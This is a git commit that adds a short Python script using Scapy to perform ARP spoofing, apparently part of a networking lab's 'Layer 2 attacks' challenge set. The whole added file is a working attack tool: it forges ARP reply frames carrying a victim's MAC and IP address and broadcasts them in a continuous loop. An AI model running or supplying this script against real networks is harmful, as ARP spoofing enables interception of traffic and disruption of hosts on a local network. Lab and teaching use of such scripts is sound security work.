3dcba372bf6a0499c0335b05008fcb525302e449
fpacenza <francescopacenza93@gmail.com>
2022-10-10 16:01:14 +0200

    added arp spoofing scripts

---
+++ Layer_2_attacks/ARP Spoofing/arp_spoofer.py
@@ -0,0 +1,17 @@
+from scapy.all import *
+import typer
+from rich.console import Console
+console = Console()
+
+
+BROADCAST = "FF:FF:FF:FF:FF:FF"
+#Victim ip address must be the same destination ip address (H2_ip) set in the ARPSpooferChallengeSender.py
+def main(victim_mac: str, victim_ip: str):
+    pkt = Ether(src=victim_mac, dst=BROADCAST)/ARP(op=2, hwsrc=victim_mac, pdst=victim_ip)
+    sendp(pkt, loop=1, inter=0.2)
+
+
+
+
+if __name__ == "__main__":
+    typer.run(main)
